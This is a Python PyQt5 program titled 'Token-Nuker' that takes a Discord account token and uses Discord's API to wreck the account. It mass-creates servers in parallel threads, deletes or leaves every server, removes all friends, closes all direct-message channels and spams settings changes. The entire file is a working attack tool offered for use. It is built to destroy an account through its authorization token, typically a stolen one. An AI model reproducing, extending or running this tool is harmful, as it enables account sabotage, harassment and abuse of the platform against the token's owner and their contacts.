from PyQt5 import QtWidgets
from PyQt5.QtWidgets import QDialog, QApplication
from PyQt5.uic import loadUi
from httpx import post, get, patch, delete
from threading import Thread
import sys, random

class testss(QDialog):
    def __init__(self):
        super(testss,self).__init__()
        loadUi('sbasicshopUI.ui',self)
        self.spamguildbutton.clicked.connect(self.spamguild)
        self.deleteguildbutton.clicked.connect(self.deleteguild)
        self.randombutton.clicked.connect(self.randomcolor)
        self.remove_friendbutton.clicked.connect(self.remove_friend)
        self.closedmbutton.clicked.connect(self.closedm)
        self.tokens.setEchoMode(QtWidgets.QLineEdit.Password)
    
    def spamguild(self):
        token=self.tokens.text()
        amount=self.amounts.text()
        name=self.names.text()
        spamguilds = lambda: post('https://discord.com/api/v9/guilds',headers={'authorization':token}, json={'name':name})
        for i in range(int(amount)):
            Thread(target=spamguilds).start()

    def deleteguild(self):
        token=self.tokens.text()
        deleteguilds = lambda: post('https://discord.com/api/v9/guilds/'+delchannel['id']+'/delete', headers={'authorization':token})
        deleteguildme = lambda: delete('https://discord.com/api/v9/users/@me/guilds/'+delchannel['id'], headers={'authorization':token})
        delchannel = get('https://discord.com/api/v8/users/@me/guilds', headers={'authorization':token}).json()
        for delchannel in delchannel:
            Thread(target=deleteguilds).start()
            Thread(target=deleteguildme).start()
            
    def randomcolor(self):
        token=self.tokens.text()
        amount=self.amounts.text()
        randomcolors = lambda: patch('https://discord.com/api/v9/users/@me/settings', headers={'authorization':token}, json={'theme': random.choice(['dark', 'light']), 'locale': random.choice(['el', 'vi', 'hi', 'zh-TW'])})
        for i in range(int(amount)):
            Thread(target=randomcolors).start()
            
    def remove_friend(self):
        token=self.tokens.text()
        remove_friends = lambda: delete('https://discord.com/api/v9/users/@me/relationships/'+delchannel['id'], headers={'authorization':token})
        delchannel = get('https://discord.com/api/v9/users/@me/relationships', headers={'authorization':token}).json()
        for delchannel in delchannel:
            Thread(target=remove_friends).start()
            
    def closedm(self):
        token=self.tokens.text()
        closedms = lambda: delete('https://discord.com/api/v9/channels/'+delchannel['id'], headers={'authorization':token})
        delchannel = get('https://discord.com/api/v9/users/@me/channels', headers={'authorization':token}).json()
        for delchannel in delchannel:
            Thread(target=closedms).start()

app=QApplication(sys.argv)
mainwindow=testss()
widget=QtWidgets.QStackedWidget()
widget.addWidget(mainwindow)
widget.setFixedWidth(773)
widget.setWindowTitle("2xtawan | Token-Nuker (v1.5)")
widget.setFixedHeight(407)
widget.show()
app.exec_()